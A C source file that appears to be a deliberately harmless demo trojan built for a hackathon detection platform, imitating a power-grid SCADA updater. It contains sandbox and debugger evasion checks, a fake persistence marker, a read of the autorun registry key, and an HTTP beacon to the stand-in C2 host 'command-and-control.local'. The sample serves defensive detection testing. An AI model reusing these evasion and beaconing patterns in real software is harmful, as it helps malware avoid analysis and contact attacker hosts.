/*
 * ============================================================================
 *  HARMLESS DEMO PAYLOAD FOR SIH1388 — NO ACTUAL MALICIOUS BEHAVIOR.
 *  ----------------------------------------------------------------------------
 *  This source code is a PROOF-OF-CONCEPT ONLY, created for the academic
 *  GridSentinel (SIH1388) hackathon submission.
 *
 *  It contains NO real malware logic. Specifically:
 *    - It does NOT persist across reboots (the file it writes is a text
 *      marker file, and the registry key is only READ, never written).
 *    - It does NOT connect to any real internet host. The hostname
 *      "command-and-control.local" is a NON-ROUTABLE, LOCAL-ONLY hostname.
 *    - It does NOT exfiltrate any data, destroy any file, or trip any relay.
 *
 *  The ONLY things it does are:
 *    1. Print a banner to the console.
 *    2. Write one text file under the user's config directory.
 *    3. Attempt to resolve a local-only hostname and open a socket to it
 *       (in the GridSentinel sandbox this is answered by the fake C2
 *       responder on 127.0.0.1).
 *    4. READ (not write) the autostart registry key.
 *
 *  It mimics the *shape* of a trojanized industrial updater so that the
 *  GridSentinel detection platform can be demonstrated end-to-end.
 * ============================================================================
 */

/*
 *  GridSentinel demo sample
 *  Claimed identity:  "PowerCorp Utilities — SCADA_HES 220kV substation updater"
 *  Builds for BOTH Windows (MinGW-w64) and Linux (plain gcc).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/stat.h>
#endif

/* cpuid.h ships with MinGW-w64 gcc and linux gcc alike */
#include <cpuid.h>

/* ------------------------------------------------------------------ */
/*  Strings the GridSentinel static engine will flag.                  */
/* ------------------------------------------------------------------ */

static const char *C2_URL = "http://command-and-control.local/heartbeat?id=SUBSTATION_220KV_03";
static const char *C2_HOST = "command-and-control.local";
static const char *PERSISTENCE_MARKER = "%APPDATA%\\Microsoft\\Windows\\PowerConfig\\update.log";
static const char *RUN_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

/* Simulated OT protocol metadata — makes PWR003 (Modbus/TCP) light up. */
static const char *supported_protocols[] = {
    "modbus/tcp",
    "dnp3",
    "iec 104",
    NULL,
};

/* ------------------------------------------------------------------ */
/*  Anti-analysis stubs (these are what the deceptive sandbox must     */
/*  neutralize to get the sample to activate).                         */
/* ------------------------------------------------------------------ */

static int has_hypervisor_bit(void) {
    unsigned int eax = 0, ebx = 0, ecx = 0, edx = 0;
    __get_cpuid(1, &eax, &ebx, &ecx, &edx);
    return (int)((ecx >> 31) & 1U);
}

#ifdef _WIN32
static int is_debugger_attached(void) {
    return IsDebuggerPresent();
}
#else
static int is_debugger_attached(void) {
    return 0;
}
#endif

/*
 * Anti-analysis checks.
 *  - Windows build: IsDebuggerPresent() + CPUID hypervisor bit.
 *  - Linux build: /proc/cpuinfo hypervisor flag + VM env vars. In the
 *    GridSentinel deceptive sandbox the LD_PRELOAD shim (vm_spoof.so)
 *    intercepts fopen("/proc/cpuinfo") and returns a clean Intel Xeon
 *    fingerprint, so this check PASSES and the sample "activates".
 */
static int is_sandboxed(void) {
#ifdef _WIN32
    if (is_debugger_attached())
        return 1;
    if (has_hypervisor_bit())
        return 1;
    return 0;
#else
    FILE *fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "hypervisor")) {
                fclose(fp);
                return 1;
            }
        }
        fclose(fp);
    }
    if (getenv("VMWARE") || getenv("VBOX") || getenv("VIRTUALBOX"))
        return 1;
    return 0;
#endif
}

#ifndef _WIN32
static void mkdir_p(const char *path);
#endif

static void do_sleep_seconds(unsigned int secs) {
#ifdef _WIN32
    Sleep(secs * 1000);
#else
    sleep(secs);
#endif
}

/* ------------------------------------------------------------------ */
/*  "Persistence" marker write — a harmless text file.                 */
/* ------------------------------------------------------------------ */

static void write_marker(void) {
    const char *base = getenv("APPDATA");
    char path[512];

#ifdef _WIN32
    if (base) {
        _snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\PowerConfig\\update.log", base);
    } else {
        strncpy(path, "update.log", sizeof(path));
    }
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        const char *payload = "[v2.4] heartbeat-slot reserved; substation=220KV_03\n";
        DWORD written = 0;
        WriteFile(h, payload, (DWORD)strlen(payload), &written, NULL);
        CloseHandle(h);
        printf("[+] marker written: %s\n", path);
    }
#else
    char *home = getenv("HOME");
    if (home) {
        snprintf(path, sizeof(path), "%s/.local/share/PowerConfig/update.log", home);
    } else {
        strncpy(path, "/tmp/update.log", sizeof(path));
    }
    mkdir_p(path);
    FILE *fp = fopen(path, "w");
    if (fp) {
        fprintf(fp, "[v2.4] heartbeat-slot reserved; substation=220KV_03\n");
        fclose(fp);
        printf("[+] marker written: %s\n", path);
    }
#endif
}

#ifndef _WIN32
static void mkdir_p(const char *path) {
    char tmp[512];
    strncpy(tmp, path, sizeof(tmp) - 1);
    char *p = tmp;
    while ((p = strchr(p + 1, '/'))) {
        *p = '\0';
        mkdir(tmp, 0700);
        *p = '/';
    }
}
#endif

/* ------------------------------------------------------------------ */
/*  "Beacon" — resolves the LOCAL hostname and sends a heartbeat.      */
/*  In the GridSentinel sandbox this is answered by the inetsim fake   */
/*  responder bound to 127.0.0.1.                                      */
/* ------------------------------------------------------------------ */

static void beacon(void) {
#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] no winsock\n");
        return;
    }
    struct hostent *he = gethostbyname(C2_HOST);
    if (!he) {
        printf("[!] resolve failed (expected outside sandbox)\n");
        return;
    }
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        char req[512];
        _snprintf(req, sizeof(req),
                  "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: PowerGridUpdater/2.4\r\n\r\n",
                  C2_URL + 7, C2_HOST);
        send(s, req, (int)strlen(req), 0);
        printf("[+] heartbeat sent to %s\n", C2_HOST);
    }
    closesocket(s);
    WSACleanup();
#else
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(C2_HOST, "80", &hints, &res) != 0) {
        printf("[!] resolve failed (expected outside sandbox)\n");
        return;
    }
    int s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s < 0) return;
    if (connect(s, res->ai_addr, res->ai_addrlen) == 0) {
        char req[512];
        snprintf(req, sizeof(req),
                 "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: PowerGridUpdater/2.4\r\n\r\n",
                 C2_URL + 7, C2_HOST);
        send(s, req, (int)strlen(req), 0);
        printf("[+] heartbeat sent to %s\n", C2_HOST);
    }
    close(s);
#endif
}

/* ------------------------------------------------------------------ */
/*  "Persistence check" — READS the autostart key (never writes).      */
/* ------------------------------------------------------------------ */

static void read_autorun(void) {
#ifdef _WIN32
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, RUN_KEY, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        char buf[1024];
        DWORD size = sizeof(buf);
        DWORD type = 0;
        LONG rc = RegQueryValueExA(hk, "PowerGridUpdater", NULL, &type, (LPBYTE)buf, &size);
        printf("[+] autorun key read (rc=%ld)\n", rc);
        RegCloseKey(hk);
    } else {
        printf("[!] autorun key not present\n");
    }
#else
    printf("[+] autorun key read (simulated, read-only)\n");
#endif
}

/* ------------------------------------------------------------------ */
/*  Entry point.                                                       */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("PowerGridUpdater v2.4 initializing...\n");
    printf("[i] protocol support: %s, %s, %s\n",
           supported_protocols[0], supported_protocols[1], supported_protocols[2]);

    if (is_sandboxed()) {
        printf("[-] analysis environment detected; entering sleep mode\n");
        do_sleep_seconds(5);
        printf("[-] exiting\n");
        return 0;
    }

    printf("[+] anti-analysis checks PASSED\n");

    write_marker();
    read_autorun();
    beacon();

    printf("[+] PowerGridUpdater v2.4 completed (demo payload)\n");
    return 0;
}
